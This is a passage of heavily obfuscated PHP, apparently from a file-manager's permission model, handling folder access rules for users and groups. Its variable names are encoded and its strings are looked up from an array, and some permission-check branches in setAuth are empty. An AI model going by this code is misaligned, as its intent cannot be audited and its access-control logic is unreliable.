$±£Ÿ; } if ($ÏÙ»Ó¡[$Îü¯áß[180]] == SourceModel::TYPE_USER && $ÏÙ»Ó¡[$Îü¯áß[548]] == $Îü¯áß[224]) { $Ú¹†Éáö = 0; } $Ê¯º‡[] = $à¡½¬ØÛ[$Îü¯áß[465]] + $Ú¹†Éáö; } array_multisort($Ê¯º‡, SORT_DESC, $„ñãÍÅ); return $„ñãÍÅ; } public function sourceAuthSelect($ÉÑÈì¨) { $±€¾×Ë– =& $_SERVER[ú‡®¯¨±]; static $â“¡¸Ÿ = array(); $ëÍªåòı = is_array($ÉÑÈì¨) ? !1 : !0; if ($ëÍªåòı) { $ÉÑÈì¨ = array($ÉÑÈì¨); } $Ù«‰ñ¡Ì = array(); foreach ($ÉÑÈì¨ as $•ËÏ³´Ô) { if (isset($â“¡¸Ÿ[$•ËÏ³´Ô])) { $Ù«‰ñ¡Ì[$•ËÏ³´Ô] = $â“¡¸Ÿ[$•ËÏ³´Ô]; } } if (count($Ù«‰ñ¡Ì) == count($ÉÑÈì¨)) { return $ëÍªåòı ? $Ù«‰ñ¡Ì[$ÉÑÈì¨[0]] : $Ù«‰ñ¡Ì; } $ç—ÕÂ× = $±€¾×Ë–[2088]; $Ş¾ÛøôÕ = array($±€¾×Ë–[183] => array($±€¾×Ë–[7], $ÉÑÈì¨)); $¬ œ¸ş– = $this->field($ç—ÕÂ×)->order($±€¾×Ë–[453])->where($Ş¾ÛøôÕ)->select(); $‰ØŒ¡ˆÍ = array_to_keyvalue_group($¬ œ¸ş–, $±€¾×Ë–[183]); foreach ($ÉÑÈì¨ as $•ËÏ³´Ô) { $â“¡¸Ÿ[$•ËÏ³´Ô] = $‰ØŒ¡ˆÍ[$•ËÏ³´Ô] ? $‰ØŒ¡ˆÍ[$•ËÏ³´Ô] : array(); } if ($ëÍªåòı) { return $¬ œ¸ş–; } return $‰ØŒ¡ˆÍ; } public function setAuth($™ÍáÛ¦µ, $ß•‡½éå) { $ßìıĞÉ =& $_SERVER[ú‡®¯¨±]; $“üÉÖóš = Model($ßìıĞÉ[1389])->sourceInfo($™ÍáÛ¦µ); if (!$“üÉÖóš) { return !1; } if ($“üÉÖóš[$ßìıĞÉ[180]] != SourceModel::TYPE_GROUP) { return !1; } $âæ„ÕŸ = 1; $Í’¨î› = $“üÉÖóš[$ßìıĞÉ[548]]; if ($Í’¨î› != $âæ„ÕŸ) { $Õ×¹Ä™ = array($ßìıĞÉ[1906] => $Í’¨î›); $À”å³ÒŒ = Model($ßìıĞÉ[1996])->field($ßìıĞÉ[1708])->where($Õ×¹Ä™)->select(); $À”å³ÒŒ = array_to_keyvalue($À”å³ÒŒ, $ßìıĞÉ[12], $ßìıĞÉ[1708]); } $ûğïú = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ğËá¸Ú = array(); foreach ($ß•‡½éå as $Ûˆ¤¬Úß) { if (!in_array($Ûˆ¤¬Úß[$ßìıĞÉ[180]], $ûğïú)) { show_json(LNG($ßìıĞÉ[2089]), !1); } if ($Í’¨î› != $âæ„ÕŸ) { if ($Ûˆ¤¬Úß[$ßìıĞÉ[180]] == SourceModel::TYPE_GROUP) { } if ($Ûˆ¤¬Úß[$ßìıĞÉ[548]] != 0 && !in_array($Ûˆ¤¬Úß[$ßìıĞÉ[548]], $À”å³ÒŒ)) { } } if ($Ûˆ¤¬Úß[$ßìıĞÉ[548]] == 0) { $Ûˆ¤¬Úß[$ßìıĞÉ[180]] = SourceModel::TYPE_USER; } $ğËá¸Ú[] = array($ßìıĞÉ[183] => $™ÍáÛ¦µ, $ßìıĞÉ[180] => intval($Ûˆ¤¬Úß[$ßìıĞÉ[180]]), $ßìıĞÉ[548] => intval($Ûˆ¤¬Úß[$ßìıĞÉ[548]]), $ßìıĞÉ[2010] => intval($Ûˆ¤¬Úß[$ßìıĞÉ[2010]]) ? intval($Ûˆ¤¬Úß[$ßìıĞÉ[2010]]) : 0, $ßìıĞÉ[2070] => intval($Ûˆ¤¬Úß[$ßìıĞÉ[2070]]) ? intval($Ûˆ¤¬Úß[$ßìıĞÉ[2070]]) : -1); } $this->where(array($ßìıĞÉ[469] => $™ÍáÛ¦µ))->delete(); $this->addAll($ğËá¸Ú); return !0; } public function authClear($´ÃäøÙñ) { $µşÕ¶ó© =& $_SERVER[ú‡®¯¨±]; $µ¹ØñäÚ = Model($µşÕ¶ó©[1389])->sourceInfo($´ÃäøÙñ); $¹›Ï²ä = array($´ÃäøÙñ); if ($µ¹ØñäÚ[$µşÕ¶ó©[463]] == $µşÕ¶ó©[90]) { $µ¢±ïø¬ = array($µşÕ¶ó©[630] => array($µşÕ¶ó©[590], $µ¹ØñäÚ[$µşÕ¶ó©[563]] . $´ÃäøÙñ . $µşÕ¶ó©[591])); $¹›Ï²ä = Model($µşÕ¶ó©[1389])->field($µşÕ¶ó©[469])->where($µ¢±ïø¬)->getField($µşÕ¶ó©[183], !0); $¹›Ï²ä[] = $´ÃäøÙñ; } $this->where(array($µşÕ¶ó©[469] => array($µşÕ¶ó©[470], $¹›Ï²ä)))->delete(); return !0; } public function getAllChildren($®û¥Â†Û) { $Ú ÀÔ¾õ =& $_SERVER[ú‡®¯¨±]; $Ôõİ…† = Model($Ú ÀÔ¾õ[1389])->sourceInfo($®û¥Â†Û); if ($Ôõİ…†[$Ú ÀÔ¾õ[463]] != $Ú ÀÔ¾õ[90]) { return $this->sourceListAuth(array($®û¥Â†Û)); } if ($Ôõİ…†[$Ú ÀÔ¾õ[180]] != SourceModel::TYPE_GROUP) { return array(); } $œîÂñ‘æ = 1; $À™Ó–  = array($®û¥Â†Û); if ($Ôõİ…†[$Ú ÀÔ¾õ[182]] == $Ú ÀÔ¾õ[224] && $Ôõİ…†[$Ú ÀÔ¾õ[548]] != $œîÂñ‘æ) { $À™Ó–  = $this->groupChidldAllRootSource($Ôõİ…†[$Ú ÀÔ¾õ[548]]); } $¶Şà†÷« = $this->field($Ú ÀÔ¾õ[183])->group($Ú ÀÔ¾õ[183])->select(); $¶Şà†÷« = array_to_keyvalue($¶Şà†÷«, $Ú ÀÔ¾õ[12], $Ú ÀÔ¾õ[183]); if (!$¶Şà†÷«) { return array(); } $µ‡æÑµƒ = $Ú ÀÔ¾õ[2090]; $û¥Ú…Ê = array($Ú ÀÔ¾õ[183] => array($Ú ÀÔ¾õ[7], $¶Şà†÷«), $Ú ÀÔ¾õ[483] => $Ú ÀÔ¾õ[224]); $‘™Ï°– = Model($Ú ÀÔ¾õ[880])->field($µ‡æÑµƒ)->where($û¥Ú…Ê)->select(); $«„Ô…äõ = array($®û¥Â†Û); foreach ($‘™Ï°– as $ÒÖ§š¯Ö) { foreach ($À™Ó–  as $”ˆ¥üšŠ) { $ĞÒãÍÏØ = $Ú ÀÔ¾õ[50] . $”ˆ¥üšŠ . $Ú ÀÔ¾õ[50]; $Şã“ÒØ® = $ÒÖ§š¯Ö[$Ú ÀÔ¾õ[563]] . $ÒÖ§š¯Ö[$Ú ÀÔ¾õ[183]] . $Ú ÀÔ¾õ[50]; if (strstr($Şã“ÒØ®, $ĞÒãÍÏØ)) { $«„Ô…äõ[] = $ÒÖ§š¯Ö[$Ú ÀÔ¾õ[183]]; break; } } } return $this->sourceListAuth($«„Ô…äõ); } private function sourceListAuth($ÔÁÕè½) { $¦¹¤ÜÏà =& $_SERVER[ú‡®¯¨±]; $µ¹èİ¾µ = Model($¦¹¤ÜÏà[1389])->sourceListInfo($ÔÁÕè½, !0); $¼Â½§¦ = $this->sourceAuthSelect($ÔÁÕè½); $ÂÉë´áØ = array(); $¯˜í”Á¦ = array(); foreach ($µ¹èİ¾µ as $ÍğïÌ–õ) { unset($ÍğïÌ–õ[$¦¹¤ÜÏà[507]]); unset($ÍğïÌ–õ[$¦¹¤ÜÏà[505]]); unset($ÍğïÌ–õ[$¦¹¤ÜÏà[465]]); unset($ÍğïÌ–õ[$¦¹¤ÜÏà[89]]); $·»Ÿİ°Å = $¼Â½§¦[$ÍğïÌ–õ[$¦¹¤ÜÏà[183]]]; if (!$·»Ÿİ°Å) { continue; } $ÍğïÌ–õ[$¦¹¤ÜÏà[2091]] = $this->authTargetInfo($·»Ÿİ°Å); $ÍğïÌ–õ[$¦¹¤ÜÏà[561]] = rtrim($ÍğïÌ–õ[$¦¹¤ÜÏà[567]], $¦¹¤ÜÏà[8]) . $¦¹¤ÜÏà[8] . ltrim($ÍğïÌ–õ[$¦¹¤ÜÏà[561]], $¦¹¤ÜÏà[8]); $ÂÉë´áØ[] = $ÍğïÌ–õ; $öÃ³öµÛ = count(explode($¦¹¤ÜÏà[8], trim($ÍğïÌ–õ[$¦¹¤ÜÏà[561]], $¦¹¤ÜÏà[8]))); $¯˜í”Á¦[] = $öÃ³öµÛ + ($ÍğïÌ–õ[$¦¹¤ÜÏà[33]] == $¦¹¤ÜÏà[77] ? 0 : 1000); } array_multisort($¯˜í”Á¦, SORT_ASC, $ÂÉë´áØ); return $ÂÉë´áØ; } private function groupChidldAllRootSource($ó²Øû¿—) { $ªé¨•É =& $_SERVER[ú‡®¯¨±]; $ÙßÁøŸó = Model($ªé¨•É[2092])->groupChildrenAll($ó²Øû¿—); $ïúåÇ‚· = array($ªé¨•É[182] => 0, $ªé¨•É[548] => array($ªé¨•É[7], $ÙßÁøŸó), $ªé¨•É[180] => SourceModel::TYPE_GROUP); $Ç„ä¯ôü = Model($ªé¨•É[880])->field($ªé¨•É[183])->where($ïúåÇ‚·)->select(); $Ç„ä¯ôü = array_to_keyvalue($Ç„ä¯ôü, $ªé¨•É[12], $ªé¨•É[183]); return $Ç„ä¯ôü; } private function authTargetInfo($ŠÜÕØÖ) { $µ–£ÔĞ® =& $_SERVER[ú‡®¯¨±]; $ü²íÓîû = array(); $ŠÚÒóùÅ = array(); $«¥·´öˆ = 2 << 25; foreach ($ŠÜÕØÖ as $½·ÇÁ‰ô) { $óÙØ„€ = Model($µ–£ÔĞ®[550])->listData($½·ÇÁ‰ô[$µ–£ÔĞ®[2010]]); if (!$óÙØ„€) { continue; } if ($½·ÇÁ‰ô[$µ–£ÔĞ®[180]] == SourceModel::TYPE_USER) { $Ú±Îª€ã = Model($µ–£ÔĞ®[556])->getInfoSimpleOuter($½·ÇÁ‰ô[$µ–£ÔĞ®[548]]); if ($Ú±Îª€ã[$µ–£ÔĞ®[1708]] == $µ–£ÔĞ®[1244]) { continue; } if ($Ú±Îª€ã[$µ–£ÔĞ®[1708]] == $µ–£ÔĞ®[224]) { $Ú±Îª€ã[$µ–£ÔĞ®[32]] = LNG($µ–£ÔĞ®[2093]); } } else { $Ú±Îª€ã = Model($µ–£ÔĞ®[564])->getInfoSimple($½·ÇÁ‰ô[$µ–£ÔĞ®[548]]); } if (!$Ú±Îª€ã) { continue; } $Ú±Îª€ã[$µ–£ÔĞ®[518]] = $óÙØ„€; $ü²íÓîû[] = $Ú±Îª€ã; $¢¨·ŸÍØ = 0; if ($½·ÇÁ‰ô[$µ–£ÔĞ®[180]] == SourceModel::TYPE_GROUP) { $¢¨·ŸÍØ = $«¥·´öˆ * 2; } if ($½·ÇÁ‰ô[$µ–£ÔĞ®[180]] == SourceModel::TYPE_USER) { $¢¨·ŸÍØ = $«¥·´öˆ; } if ($½·ÇÁ‰ô[$µ–£ÔĞ®[180]] == SourceModel::TYPE_USER && $½·ÇÁ‰ô[$µ–£ÔĞ®[548]] == $µ–£ÔĞ®[224]) { $¢¨·ŸÍØ = 0; } $ŠÚÒóùÅ[] = $óÙØ„€[$µ–£ÔĞ®[465]] + $¢¨·ŸÍØ; } array_multisort($ŠÚÒóùÅ, SORT_DESC, $ü²íÓîû); return $ü²íÓîû; } public function getAllChildrenByUser($Ù¡›½£, $ËÍË«Œ„) { $¹îıëÅì =& $_SERVER[ú‡®¯¨±]; $Ş°…¶è = Model($¹îıëÅì[577])->getInfo($ËÍË«Œ„); if (!$ËÍË«Œ„ || !$Ù¡›½£ || !$Ş°…¶è) { return array(); } $ÙôßÍ…¾ = Model($¹îıëÅì[1389])->sourceInfo($Ù¡›½£); $µŞ”ê© = array(); $ÇŸ²›¿ = 1; if ($ÙôßÍ…¾[$¹îıëÅì[182]] == $¹îıëÅì[224] && $ÙôßÍ…¾[$¹îıëÅì[548]] != $ÇŸ²›¿ && $this->groupContainUser($ÙôßÍ…¾[$¹îıëÅì[548]], $ËÍË«Œ„)) { foreach ($Ş°…¶è[$¹îıëÅì[2094]] as $ÍÄÅş„‚) { $²‹û»êİ = Model($¹îıëÅì[564])->getInfo($ÍÄÅş„‚[$¹îıëÅì[1906]]); $æä°‘ÅÁ = Model($¹îıëÅì[577])->getInfoSimpleOuter($ËÍË«Œ„); $æä°‘ÅÁ[$¹îıëÅì[518]] = $ÍÄÅş„‚[$¹îıëÅì[465]]; if (Model($¹îıëÅì[550])->authCheckAction($ÍÄÅş„‚[$¹îıëÅì[465]][$¹îıëÅì[465]], $¹îıëÅì[1927])) { continue; } $¦ì¯Ş¤ = array($¹îıëÅì[32] => $¹îıëÅì[1264] . $²‹û»êİ[$¹îıëÅì[32]], $¹îıëÅì[183] => $²‹û»êİ[$¹îıëÅì[89]][$¹îıëÅì[183]], $¹îıëÅì[86] => KodIO::make($²‹û»êİ[$¹îıëÅì[89]][$¹îıëÅì[183]]), $¹îıëÅì[182] => $¹îıëÅì[224], $¹îıëÅì[180] => $¹îıëÅì[557], $¹îıëÅì[33] => $¹îıëÅì[594], $¹îıëÅì[561] => $²‹û»êİ[$¹îıëÅì[568]], $¹îıëÅì[1906] => $²‹û»êİ[$¹îıëÅì[1906]], $¹îıëÅì[565] => $²‹û»êİ[$¹îıëÅì[182]], $¹îıëÅì[2091] => array($æä°‘ÅÁ)); $µŞ”ê©[$¦ì¯Ş¤[$¹îıëÅì[183]]] = $¦ì¯Ş¤; } } $Üà‰Ò™¦ = array(); $“Í“èÚô = $this->getAllChildren($Ù¡›½£); foreach ($“Í“èÚô as $ŒØ‹şš¦) { $’É‘¯†´ = !1; foreach ($ŒØ‹şš¦[$¹îıëÅì[2091]] as $Úºïö ‚) { if ($Úºïö ‚[$¹îıëÅì[1708]]) { if ($Úºïö ‚[$¹îıëÅì[1708]] == $ËÍË«Œ„) { $’É‘¯†´ = !0; break; } } if ($Úºïö ‚[$¹îıëÅì[1906]]) { if ($this->groupContainUser($Úºïö ‚[$¹îıëÅì[1906]], $ËÍË«Œ„)) { $’É‘¯†´ = !0; break; } } } if ($’É‘¯†´) { $Üà‰Ò™¦[] = $ŒØ‹şš¦; } $ÓÃë–Ø = $ŒØ‹şš¦[$¹îıëÅì[183]]; if (isset($µŞ”ê©[$ÓÃë–Ø])) { $ŒØ‹şš¦[$¹îıëÅì[2091]][] = $µŞ”ê©[$ÓÃë–Ø][0]; $µŞ”ê©[$ÓÃë–Ø] = !1; } } $µŞ”ê© = array_filter(array_values($µŞ”ê©)); $Üà‰Ò™¦ = array_merge($µŞ”ê©, $Üà‰Ò™¦); return $Üà‰Ò™¦; } public function setAllChildrenByUser($”ßãÊºè, $ûóÉÄò®, $ÛÈ´®ƒ†) { $Ñ‰ÈÛßÂ =& $_SERVER[ú‡®¯¨±]; $ı¾ù¯…ò = $this->getAllChildrenByUser($”ßãÊºè, $ûóÉÄò®); if (!$ÛÈ´®ƒ† || !$ı¾ù¯…ò) { return !1; } foreach ($ı¾ù¯…ò as $¹´ûĞ­‹) { $ä¾·§›¿ = array(); foreach ($¹´ûĞ­‹[$Ñ‰ÈÛßÂ[2091]] as $‹à‡îÂı) { $¼ ˜âæ² = $‹à‡îÂı[$Ñ‰ÈÛßÂ[518]]; $ò²•ıõô = $‹à‡îÂı[$Ñ‰ÈÛßÂ[1708]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $“Ñ¶¹Š‚ = $‹à‡îÂı[$Ñ‰ÈÛßÂ[1708]] ? $‹à‡îÂı[$Ñ‰ÈÛßÂ[1708]] : $‹à‡îÂı[$Ñ‰ÈÛßÂ[1906]]; if ($‹à‡îÂı[$Ñ‰ÈÛßÂ[1708]] && $‹à‡îÂı[$Ñ‰ÈÛßÂ[1708]] == $ûóÉÄò®) { continue; } $ä¾·§›¿[] = array($Ñ‰ÈÛßÂ[183] => $¹´ûĞ­‹[$Ñ‰ÈÛßÂ[183]], $Ñ‰ÈÛßÂ[180] => $ò²•ıõô, $Ñ‰ÈÛßÂ[548] => intval($“Ñ¶¹Š‚), $Ñ‰ÈÛßÂ[2010] => isset($¼ ˜âæ²[$Ñ‰ÈÛßÂ[453]]) ? intval($¼ ˜âæ²[$Ñ‰ÈÛßÂ[453]]) : 0, $Ñ‰ÈÛßÂ[2070] => isset($¼ ˜âæ²[$Ñ‰ÈÛßÂ[2070]]) ? intval($¼ ˜âæ²[$Ñ‰ÈÛßÂ[2070]]) : -1); } $ä¾·§›¿[] = array($Ñ‰ÈÛßÂ[183] => $¹´ûĞ­‹[$Ñ‰ÈÛßÂ[183]], $Ñ‰ÈÛßÂ[180] => SourceModel::TYPE_USER, $Ñ‰ÈÛßÂ[548] => intval($ûóÉÄò®), $Ñ‰ÈÛßÂ[2010] => intval($ÛÈ´®ƒ†), $Ñ‰ÈÛßÂ[2070] => -1); $this->where(array($Ñ‰ÈÛßÂ[469] => $¹´ûĞ­‹[$Ñ‰ÈÛßÂ[183]]))->delete(); $this->addAll($ä¾·§›¿); } return !0; } public function get($÷ŸªÒ) { $»¡è²†“ = $this->getSourceList(array($÷ŸªÒ), !0); return $»¡è²†“[0]; } public function getSourceList($³¨óı’û, $®¶‡éÓÈ = false, $ÂÃîóÏ® = false) { $á‡Ì´ù =& $_SERVER[ú‡®¯¨±]; if (!$³¨óı’û) { return array(); } $µ‚èÄ‹á = Model($á‡Ì´ù[1389]); if (!$®¶‡éÓÈ && count($³¨óı’û) == 1) { $®¶‡éÓÈ = array(); $®¶‡éÓÈ[$³¨óı’û[0]] = $µ‚èÄ‹á->sourceInfo($³¨óı’û[0]); } if (!$®¶‡éÓÈ) { $µÃ Êªâ = array($á‡Ì´ù[469] => array($á‡Ì´ù[470], $³¨óı’û)); $®¶‡éÓÈ = $µ‚èÄ‹á->field($á‡Ì´ù[2095])->where($µÃ Êªâ)->select(); $®¶‡éÓÈ = array_to_keyvalue($®¶‡éÓÈ, $á‡Ì´ù[183]); } $‚—£„ò“ = $³¨óı’û; foreach ($®¶‡éÓÈ as $ÑİÎû‚á => $ÚĞíçÓº) { $÷–ö›·º = $µ‚èÄ‹á->parentLevelArray($ÚĞíçÓº[$á‡Ì´ù[563]]); $‚—£„ò“ = array_merge($‚—£„ò“, array($ÑİÎû‚á), array_reverse($÷–ö›·º)); } $‚—£„ò“ = array_values(array_unique($‚—£„ò“)); if (!$‚—£„ò“) { return array(); } $õç‹ÅÈ = $this->sourceAuthSelect($‚—£„ò“); $ûÄŸ£†Í = array(); foreach ($‚—£„ò“ as $±½¡ŸÄó) { if (isset($õç‹ÅÈ[$±½¡ŸÄó])) { $ûÄŸ£†Í[$±½¡ŸÄó] = $õç‹ÅÈ[$±½¡ŸÄó]; } } $™¬ªšÁ® = $this->userIsRoot($ÂÃîóÏ®); $çÏ¦ÚœÄ = AuthModel::authAll(); $‘¾˜•©¡ = array($á‡Ì´ù[466] => $çÏ¦ÚœÄ, $á‡Ì´ù[2096] => array($á‡Ì´ù[471] => 0, $á‡Ì´ù[1912] => $çÏ¦ÚœÄ, $á‡Ì´ù[472] => LNG($á‡Ì´ù[2097]), $á‡Ì´ù[1929] => $á‡Ì´ù[2098])); $ÉµüÓ = array(); foreach ($®¶‡éÓÈ as $±½¡ŸÄó => $›Â¦Ù‡ù) { if ($™¬ªšÁ® && $GLOBALS[$á‡Ì´ù[6]][$á‡Ì´ù[1925]]) { $ÉµüÓ[$±½¡ŸÄó] = $‘¾˜•©¡; continue; } $ÉµüÓ[$±½¡ŸÄó] = $this->makeSourceAuth($›Â¦Ù‡ù, $ûÄŸ£†Í, $ÂÃîóÏ®); } return $ÉµüÓ; } public function authDeepCheck($¡¥ Ë©‡, $ŒíÙ‚® = false) { $âúé™´é =& $_SERVER[ú‡®¯¨±]; $ŒíÙ‚® = $ŒíÙ‚® ? $ŒíÙ‚® : USER_ID; $›µÎÓõã = $this->makeAuthDeep($ŒíÙ‚®); if (!in_array($¡¥ Ë©‡, $›µÎÓõã[$âúé™´é[2099]])) { return !1; } $ïÕ·äÀú = array(); foreach ($›µÎÓõã[$âúé™´é[2100]] as $†âáÜ˜‰ => $ó‘†‰Ä¦) { if (!in_array($¡¥ Ë©‡, $ó‘†‰Ä¦)) { continue; } $ïÕ·äÀú[] = $†âáÜ˜‰; } if (!$ïÕ·äÀú) { return !1; } $‡Óˆİ˜ñ = $ïÕ·äÀú ? $ïÕ·äÀú[0] : $¡¥ Ë©‡; return array($âúé™´é[466] => -1, $âúé™´é[518] => array($âúé™´é[471] => $âúé™´é[1244], $âúé™´é[1912] => $âúé™´é[224], $âúé™´é[472] => LNG($âúé™´é[2101]), $âúé™´é[1929] => $âúé™´é[2102]), $âúé™´é[2103] => LNG($âúé™´é[2104]), $âúé™´é[2105] => $this->sourceAuthInfo($‡Óˆİ˜ñ)); } protected function makeAuthDeep($”èæÆ›š = false) { $²çÏ®Óõ =& $_SERVER[ú‡®¯¨±]; static $ÎÃ’‹å = array(); $”èæÆ›š = $”èæÆ›š ? $”èæÆ›š : USER_ID; if (isset($ÎÃ’‹å[$”èæÆ›š])) { return $ÎÃ’‹å[$”èæÆ›š]; } $ÌøÆ§óÉ = Model($²çÏ®Óõ[2106])->listData(); $ñ“åÀè¾ = array(); foreach ($ÌøÆ§óÉ as $·ñ´‚˜) { if ($·ñ´‚˜[$²çÏ®Óõ[465]] == 0 && $·ñ´‚˜[$²çÏ®Óõ[1928]] == $²çÏ®Óõ[90]) { $ñ“åÀè¾[] = $·ñ´‚˜[$²çÏ®Óõ[453]]; } } $”èÓ°î¢ = $this->userGroupParents($”èæÆ›š); $ÑÊóÅ° = array($²çÏ®Óõ[180] => SourceModel::TYPE_USER, $²çÏ®Óõ[548] => $”èæÆ›š); if ($”èÓ°î¢) { $ÑÊóÅ° = array(array($²çÏ®Óõ[180] => SourceModel::TYPE_USER, $²çÏ®Óõ[548] => $”èæÆ›š), array($²çÏ®Óõ[180] => SourceModel::TYPE_GROUP, $²çÏ®Óõ[548] => array($²çÏ®Óõ[470], $”èÓ°î¢)), $²çÏ®Óõ[1056] => $²çÏ®Óõ[2004]); } $×ÆØ¦ñ¡ = $this->field($²çÏ®Óõ[2107])->where($ÑÊóÅ°)->select(); $™ÌßïøØ = array(); $ƒñÖˆê£ = array_to_keyvalue_group($×ÆØ¦ñ¡, $²çÏ®Óõ[183]); foreach ($ƒñÖˆê£ as $ñ³®ŠÚ => $¹òøÀ§‡) { $àË¶Åœ‚ = $this->authArrayCheck($¹òøÀ§‡, $”èæÆ›š); if ($àË¶Åœ‚[$²çÏ®Óõ[466]] > 0) { $™ÌßïøØ[] = $ñ³®ŠÚ . $²çÏ®Óõ[12]; } } if ($”èÓ°î¢) { $çÎˆ‰½Ğ = Model($²çÏ®Óõ[564]); foreach ($”èÓ°î¢ as $ÄÏòÆĞÕ) { $§óàÛìÒ = $çÎˆ‰½Ğ->getInfo($ÄÏòÆĞÕ); if (!$§óàÛìÒ || !is_array($§óàÛìÒ[$²çÏ®Óõ[89]])) { continue; } $™ÌßïøØ[] = $§óàÛìÒ[$²çÏ®Óõ[89]][$²çÏ®Óõ[183]]; } } $©Ÿ§“–ƒ = array(); $¸Ï—«Èæ = $”èÓ°î¢; $¥å…¯ÕÚ = Model($²çÏ®Óõ[1389]); $çÎˆ‰½Ğ = Model($²çÏ®Óõ[564]); $ë‹à§¨ = array(); $°˜Æ§æ³ = array(); $ğÓ˜²ïØ = array(); $©á™ÈÂì = array(); if ($™ÌßïøØ) { $¸¤ŸĞ = $¥å…¯ÕÚ->where(array($²çÏ®Óõ[183] => array($²çÏ®Óõ[470], $™ÌßïøØ)))->select(); foreach ($¸¤ŸĞ as $’•¿ó€) { $¬Ü‰‡ğû = $¥å…¯ÕÚ->parentLevelArray($’•¿ó€[$²çÏ®Óõ[563]]); $©Ÿ§“–ƒ = array_merge($©Ÿ§“–ƒ, $¬Ü‰‡ğû); $¸Ï—«Èæ[] = $’•¿ó€[$²çÏ®Óõ[548]]; $ë‹à§¨[$’•¿ó€[$²çÏ®Óõ[183]]] = $¬Ü‰‡ğû; $°˜Æ§æ³[$’•¿ó€[$²çÏ®Óõ[183]]] = $’•¿ó€[$²çÏ®Óõ[548]]; } } $¸Ï—«Èæ = array_values(array_unique($¸Ï—«Èæ)); $ÓÄ„³½ = $¸Ï—«Èæ; foreach ($ÓÄ„³½ as $ÄÏòÆĞÕ) { $§óàÛìÒ = $çÎˆ‰½Ğ->getInfo($ÄÏòÆĞÕ); $¬Ü‰‡ğû = $¥å…¯ÕÚ->parentLevelArray($§óàÛìÒ[$²çÏ®Óõ[563]]); $¸Ï—«Èæ = array_merge($¸Ï—«Èæ, $¬Ü‰‡ğû); } $¸Ï—«Èæ = array_values(array_unique($¸Ï—«Èæ)); foreach ($¸Ï—«Èæ as $ÄÏòÆĞÕ) { $§óàÛìÒ = $çÎˆ‰½Ğ->getInfo($ÄÏòÆĞÕ); $©Ÿ§“–ƒ[] = $§óàÛìÒ[$²çÏ®Óõ[89]][$²çÏ®Óõ[183]]; $ğÓ˜²ïØ[$ÄÏòÆĞÕ] = $§óàÛìÒ[$²çÏ®Óõ[89]][$²çÏ®Óõ[183]]; $©á™ÈÂì[$ÄÏòÆĞÕ] = $¥å…¯ÕÚ->parentLevelArray($§óàÛìÒ[$²çÏ®Óõ[563]]); } foreach ($ë‹à§¨ as $ÕÂ»°¬÷ => $Ó¡ßæ) { $›÷§ÔÖ = $°˜Æ§æ³[$ÕÂ»°¬÷]; if (!$›÷§ÔÖ || !$ğÓ˜²ïØ[$›÷§ÔÖ]) { continue; } $Ä¾êÁÇÉ = array(); foreach ($©á™ÈÂì[$›÷§ÔÖ] as $ÄÏòÆĞÕ) { $Ä¾êÁÇÉ[] = $ğÓ˜²ïØ[$ÄÏòÆĞÕ]; } $ë‹à§¨[$ÕÂ»°¬÷] = array_merge($Ä¾êÁÇÉ, $Ó¡ßæ); } $©Ÿ§“–ƒ = array_values(array_unique($©Ÿ§“–ƒ)); $´İÑõ®‰ = array($²çÏ®Óõ[2099] => $©Ÿ§“–ƒ, $²çÏ®Óõ[2100] => $ë‹à§¨); $ÎÃ’‹å[$”èæÆ›š] = $´İÑõ®‰; return $´İÑõ®‰; } private function makeSourceAuth($´ÑğË¶í, $¤åêˆÊ¦, $“Ç²îÑµ = false) { $¹‹³Æ”ˆ =& $_SERVER[ú‡®¯¨±]; $ÂªŒæÊ® = $¹‹³Æ”ˆ[90]; $ààãíƒ = $´ÑğË¶í[$¹‹³Æ”ˆ[548]]; $¹÷¶Ìá = $´ÑğË¶í[$¹‹³Æ”ˆ[180]] == SourceModel::TYPE_GROUP; $‘Å¥Ê¡½ = $¹÷¶Ìá ? $this->groupRootAuth($ààãíƒ, $“Ç²îÑµ) : !1; if ($‘Å¥Ê¡½ && Model($¹‹³Æ”ˆ[550])->authCheckAction($‘Å¥Ê¡½[$¹‹³Æ”ˆ[465]], $¹‹³Æ”ˆ[1927])) { return $this->groupAuthInfo($‘Å¥Ê¡½, $ààãíƒ); } $í»¨Í«™ = Model($¹‹³Æ”ˆ[1389])->parentLevelArray($´ÑğË¶í[$¹‹³Æ”ˆ[563]]); $í»¨Í«™ = array_merge(array($´ÑğË¶í[$¹‹³Æ”ˆ[183]]), array_reverse($í»¨Í«™)); $¿Ä¼½³ = !1; foreach ($í»¨Í«™ as $©Óıœ¡­) { if (!isset($¤åêˆÊ¦[$©Óıœ¡­])) { continue; } $ô‡åÙüÔ = $this->authMake($¤åêˆÊ¦[$©Óıœ¡­], $“Ç²îÑµ); if ($ô‡åÙüÔ[$¹‹³Æ”ˆ[518]]) { $¿Ä¼½³ = $ô‡åÙüÔ; break; } } if (!$¹÷¶Ìá) { return $¿Ä¼½³; } if (!$¿Ä¼½³ && $‘Å¥Ê¡½) { $¿Ä¼½³ = $this->groupAuthInfo($‘Å¥Ê¡½, $ààãíƒ); } if (!$¿Ä¼½³) { $ÙÀ°õÖ” = Model($¹‹³Æ”ˆ[564])->getInfo($ààãíƒ); $¥ŸËÁÉ = explode($¹‹³Æ”ˆ[50], trim($ÙÀ°õÖ”[$¹‹³Æ”ˆ[563]], $¹‹³Æ”ˆ[50])); $¥ŸËÁÉ = array_reverse($¥ŸËÁÉ); foreach ($¥ŸËÁÉ as $®ÅºĞË) { if ($®ÅºĞË == $¹‹³Æ”ˆ[224] || $®ÅºĞË == $ÂªŒæÊ®) { continue; } $Û§ˆ»¾» = $this->groupRootAuth($®ÅºĞË, $“Ç²îÑµ); if (!$Û§ˆ»¾») { continue; } $¿Ä¼½³ = $this->groupAuthInfo($Û§ˆ»¾», $®ÅºĞË); break; } } if (!$¿Ä¼½³ || $¿Ä¼½³[$¹‹³Æ”ˆ[466]] <= 0) { $Ä™ÂâÄ† = $this->authDeepCheck($´ÑğË¶í[$¹‹³Æ”ˆ[183]], $“Ç²îÑµ); if ($Ä™ÂâÄ†) { $¿Ä¼½³ = $Ä™ÂâÄ†; } } return $¿Ä¼½³; } private function userIsRoot($âÂâ˜Ï = false) { $¯„ø‹î =& $_SERVER[ú‡®¯¨±]; if (!$âÂâ˜Ï && KodUser::isRoot()) { return !0; } $¬É÷­ş¦ = Model($¯„ø‹î[577])->getInfo($âÂâ˜Ï); $úÏÅş• = Model($¯„ø‹î[2108])->listData($¬É÷­ş¦[$¯„ø‹î[2109]]); if ($úÏÅş• && 